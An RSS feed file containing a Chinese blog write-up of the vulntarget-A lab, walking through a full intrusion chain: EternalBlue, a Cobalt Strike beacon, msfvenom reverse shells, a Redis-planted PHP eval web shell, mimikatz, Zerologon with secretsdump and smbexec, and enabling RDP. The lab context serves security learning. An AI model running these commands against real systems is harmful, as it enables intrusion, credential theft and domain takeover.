@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>vulntarget on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/series/vulntarget/</link><description>Recent content in vulntarget on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Apr 2022 22:08:10 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/series/vulntarget/index.xml" rel="self" type="application/rss+xml"/><item><title>vluntargetA靶场笔记</title><link>https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/</link><pubDate>Sun, 24 Apr 2022 22:08:10 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/vulntarget-a-notes/</guid><description>&lt;blockquote>
+&lt;p>本机 192.168.110.131&lt;/p>
+&lt;p>靶机win7 192.168.110.129; 10.0.20.98&lt;/p>
+&lt;p>域用户win2016 10.0.20.98; 10.0.10.111&lt;/p>
+&lt;p>域控win2019 10.0.10.110&lt;/p>
+&lt;/blockquote>
+&lt;p>访问192.168.110.129的80web页面，是通达OA&lt;/p>
+&lt;p>/inc/expired.php页面获得版本信息&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324162505563.png" alt="image-20220324162505563">&lt;/p>
+&lt;p>nmap扫一下，开了445的win7，试一下永恒之蓝&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>use auxiliary/scanner/smb/smb_ms17_010
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>use exploit/windows/smb/ms17_010_eternalblue
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到shell，看下网络信息&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220324164533684.png" alt="image-20220324164533684">&lt;/p>
+&lt;p>有一个内网ip 10.0.20.98&lt;/p>
+&lt;p>msf的不稳定，做进程迁移；上传npc做socks5代理&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/windows/manage/migrate
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; upload /home/kali/t00ls/nps_client_win/npc.exe C:&lt;span style="color:#8045ff">\\&lt;/span>Users
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe install -server&lt;span style="color:#f92672">=&lt;/span>xxx -vkey&lt;span style="color:#f92672">=&lt;/span>xxx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe start
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>vim /etc/proxychains4.conf
+# proxy dns
+socks5 ip port
+&lt;/code>&lt;/pre>&lt;p>另外传一个cs的🐎并上线&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; upload /home/kali/t3mp/cs1.exe C:&lt;span style="color:#8045ff">\\&lt;/span>Users
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>beacon &amp;gt; sleep &lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>挂代理后扫描内网c段&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 nmap -Pn 10.0.20.98/24
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现10.0.20.99有redis，尝试redis未授权写shell（实际这里扫崩了，直接打的&lt;/p>
+&lt;p>更蛋疼的是kali安装不了redis-cli，各种换源都无解，只能把原来只代给局域网的再代给公网，连出来打&lt;/p>
+&lt;p>首先生成个msf🐎连给我自己的kali虚拟机，这里的坑点：两处的payload要严格一致（别多一个或少一个x64，另外lhost设为0.0.0.0才可以被代出去&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp &lt;span style="color:#111">LHOST&lt;/span>&lt;span style="color:#f92672">=&lt;/span>vps_ip &lt;span style="color:#111">LPORT&lt;/span>&lt;span style="color:#f92672">=&lt;/span>port -f exe &amp;gt; msfr.exe
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> payload windows/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lhost 0.0.0.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lport &lt;span style="color:#ae81ff">2308&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在得到的shell里把之前注册好的npc取消注册后重新注册为公网的&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>npc.exe stop
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe uninstall
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe install -server&lt;span style="color:#f92672">=&lt;/span>xxx -vkey&lt;span style="color:#f92672">=&lt;/span>xxx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npc.exe start
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>和之前一样，改proxychains的配置文件（不复制了），windows用proxifier（也很简单）&lt;/p>
+&lt;p>2308 meterpreter&lt;/p>
+&lt;p>2309 socks5 win7 win7123&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 redis-cli -h 10.0.20.99
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; config &lt;span style="color:#111">set&lt;/span> dir &lt;span style="color:#d88200">&amp;#34;C:/phpStudy/PHPTutorial/WWW/&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; config &lt;span style="color:#111">set&lt;/span> dbfilename tx.php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; &lt;span style="color:#111">set&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;?php @eval(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#d88200">[&amp;#39;ame&amp;#39;]);?&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt; save
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>连蚁剑，cs上用代理转发上线 via 10.0.20.98，所以需要再前面把公网的代理换回去，再uninstall install 一次&lt;/p>
+&lt;p>注意实测pivoting-&amp;gt;Listener这样生成的反向马并不能弹回来，原因未知；解决办法是生成Listener为beacon TCP的正向马，再在之前的beacon中connect 10.0.20.99，即可上线&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114155490.png" alt="image-20220326114155490">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326114119006.png" alt="image-20220326114119006">&lt;/p>
+&lt;p>mimikatz抓密码，得到非明文hash&lt;/p>
+&lt;p>上传msf正向🐎并连接&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/x64/meterpreter/bind_tcp &lt;span style="color:#111">LPORT&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6698&lt;/span> -f exe &amp;gt; msfr2.exe
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> proxies socks5:192.168.110.131:8879
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> payload windows/x64/meterpreter/bind_tcp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> lport &lt;span style="color:#ae81ff">6698&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">set&lt;/span> rhost 10.0.20.99
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/windows/manage/migrate
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但这里得到的session非常容易断，动不动就reason: died，只能手动把马和exploit多用几次&lt;/p>
+&lt;p>定位域控&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>run post/windows/gather/enum_domain
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>得到域和域控信息&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220326163730199.png" alt="image-20220326163730199">&lt;/p>
+&lt;p>添加主机对10.0.10.*的路由&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msf &amp;gt; &lt;span style="color:#111">bg&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf &amp;gt; sessions x
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>meterpreter &amp;gt; run post/multi/mamage/autoroute
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>nmap简单扫一下&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 nmap -sS -Pn 10.0.10.110
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用cve-2020-1472域内提权&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains4 python3 cve-2020-1472-exploit.py win2019 10.0.10.110
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proxychains4 python3 secretsdump.py vulntarget.com/win2019&lt;span style="color:#8045ff">\$&lt;/span>@10.0.10.110 -no-pass &lt;span style="color:#75715e"># 得到administrator的hash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proxychains4 python3 smbexec.py -hashes &amp;lt;hash&amp;gt; administrator@10.0.10.110
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>开启远程桌面&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>reg add &lt;span style="color:#d88200">&amp;#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span> /t REG_DWORD /v portnumber /d &lt;span style="color:#ae81ff">3389&lt;/span> /f
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wmic RDTOGGLE WHERE &lt;span style="color:#111">ServerName&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;%COMPUTERNAME%&amp;#39;&lt;/span> call SetAllowTSConnections &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>netsh advfirewall firewall add rule &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Remote Desktop&amp;#34;&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>TCP &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>in &lt;span style="color:#111">localport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3389&lt;/span> &lt;span style="color:#111">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>allow
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>proxychains rdesktop 10.0.10.110
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
